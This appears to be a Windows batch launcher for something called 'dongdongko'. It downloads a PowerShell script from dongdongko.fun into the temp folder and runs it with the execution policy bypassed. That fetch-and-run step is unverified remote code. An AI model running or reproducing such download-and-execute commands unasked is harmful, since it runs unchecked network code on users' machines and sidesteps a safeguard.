@echo off
setlocal
set "DDK_BOOT=%TEMP%\dongdongko-start.ps1"
powershell -NoProfile -Command "try { Invoke-WebRequest -UseBasicParsing 'https://dongdongko.fun/assets/start-dongdongko.ps1' -OutFile $env:DDK_BOOT -TimeoutSec 60 } catch { Write-Host 'Download failed. Please retry.'; exit 1 }"
if errorlevel 1 (pause & exit /b 1)
powershell -NoProfile -ExecutionPolicy Bypass -File "%DDK_BOOT%"
if errorlevel 1 pause
endlocal
